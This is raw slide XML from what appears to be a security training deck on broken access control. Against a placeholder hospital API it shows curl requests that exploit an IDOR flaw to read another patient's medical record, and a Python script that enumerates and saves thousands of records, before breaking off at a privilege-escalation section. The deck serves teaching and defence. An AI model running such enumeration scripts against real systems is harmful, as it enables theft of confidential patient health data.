              <a:t>Step 1: Establish Authenticated Session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2267545"/>
            <a:ext cx="6438662" cy="785813"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6354"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="725686" y="2267545"/>
            <a:ext cx="6450330" cy="785813"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="844510" y="2356604"/>
            <a:ext cx="6212681" cy="607695"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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curl -X POST https://hospital.example.com/api/login \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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-H "Content-Type: application/json" \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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-d '{"username": "patient123", "password": "password"}' \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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-c cookies.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3133368"/>
            <a:ext cx="6438662" cy="151924"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Identify Your Record ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3365302"/>
            <a:ext cx="6438662" cy="1849279"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2700"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="725686" y="3365302"/>
            <a:ext cx="6450330" cy="1849279"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 964"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="844510" y="3454360"/>
            <a:ext cx="6212681" cy="1671161"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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curl -X GET https://hospital.example.com/api/medical-records/5001 \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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-b cookies.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"recordId": 5001,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"patientName": "John Attacker",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"diagnosis": "Common Cold",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"medications": ["Aspirin"],</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"doctorNotes": "Patient recovering well"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5294590"/>
            <a:ext cx="6438662" cy="151924"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 3: Test IDOR Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5526524"/>
            <a:ext cx="6438662" cy="2001203"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2495"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="725686" y="5526524"/>
            <a:ext cx="6450330" cy="2001203"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 891"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="844510" y="5615583"/>
            <a:ext cx="6212681" cy="1823085"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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curl -X GET https://hospital.example.com/api/medical-records/5002 \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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-b cookies.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"recordId": 5002,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"patientName": "Jane Victim",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"diagnosis": "HIV Positive",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"medications": ["Antiretroviral therapy"],</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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"doctorNotes": "Confidential treatment plan..."</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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VULNERABLE! Unauthorized access confirmed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7382232" y="1659136"/>
            <a:ext cx="6609874" cy="5948601"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1439"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7501057" y="1730335"/>
            <a:ext cx="2383274" cy="234077"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Automated Mass Extraction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7501057" y="2035612"/>
            <a:ext cx="6372225" cy="303848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Once the IDOR vulnerability is confirmed, attackers deploy automated scripts to enumerate and extract all accessible records systematically.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7501057" y="2419469"/>
            <a:ext cx="6372225" cy="4431983"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1127"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7495223" y="2419469"/>
            <a:ext cx="6383893" cy="4431983"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 402"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7614047" y="2508528"/>
            <a:ext cx="6146244" cy="4253865"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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import requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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import json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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session = requests.Session()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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Authenticate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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login_data = {"username": "patient123", "password": "password"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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session.post("https://hospital.example.com/api/login", json=login_data)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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Extract all records</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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stolen_records = []</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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for record_id in range(1, 10000):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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response = session.get(</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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f"https://hospital.example.com/api/medical-records/{record_id}"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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if response.status_code == 200:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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record = response.json()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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stolen_records.append(record)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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print(f"[+] Extracted record {record_id}: {record['patientName']}")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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if record_id % 100 == 0:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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print(f"[*] Progress: {record_id}/10000")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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Save complete dataset</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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with open('stolen_medical_records.json', 'w') as f:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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json.dump(stolen_records, f, indent=2)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="115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print(f"[+] Total records stolen: {len(stolen_records)}")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7501057" y="6931462"/>
            <a:ext cx="6372225" cy="303848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Complete compromise of patient privacy, HIPAA violations, exposure of sensitive medical conditions, treatment plans, and personally identifiable information for thousands of patients.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729746"/>
            <a:ext cx="7556421" cy="1488519"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>7.2 Privilege Escalation - Admin Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6280190" y="4308991"/>
            <a:ext cx="7556421" cy="1190863"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3750" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Target: Content Management System</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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02449" y="311825"/>
            <a:ext cx="4552950"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable User Update Function</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
